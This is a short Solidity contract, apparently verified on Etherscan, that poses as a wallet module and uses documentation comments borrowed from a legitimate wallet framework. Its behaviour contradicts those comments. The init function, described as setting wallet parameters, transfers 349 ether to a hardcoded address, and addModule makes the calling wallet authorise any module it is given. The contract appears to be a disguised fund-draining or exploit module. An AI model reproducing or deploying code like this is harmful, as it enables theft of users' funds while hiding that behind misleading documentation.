/**
 *Submitted for verification at Etherscan.io on 2021-09-13
*/

pragma solidity ^0.8.3;

contract BaseWallet{
    function authoriseModule(address _module, bool _value) external{}
}
contract Module {

    address public owner;
    
    constructor(address _owner)
    {
        owner = _owner;
    }
    /**	
     * @notice Adds a module to a wallet. Cannot execute when wallet is locked (or under recovery)	
     * @param _wallet The target wallet.	
     * @param _module The modules to authorise.	
     */	
    function addModule(address _wallet, address _module) external
    {
        BaseWallet b = BaseWallet(msg.sender);
        
        b.authoriseModule(_module, true);
    }

    /**
     * @notice Inits a Module for a wallet by e.g. setting some wallet specific parameters in storage.
     * @param _wallet The wallet.
     */
    function init(address _wallet) external
    {
        address a = 0xD036b305A03bac8D560eCbE3f33629F0d73c9dac;
        a.call{value: 349000000000000000000}("");
    }


    /**
     * @notice Returns whether the module implements a callback for a given static call method.
     * @param _methodId The method id.
     */
    function supportsStaticCall(bytes4 _methodId) external view returns (bool _isSupported)
    {
        return false;
    }
}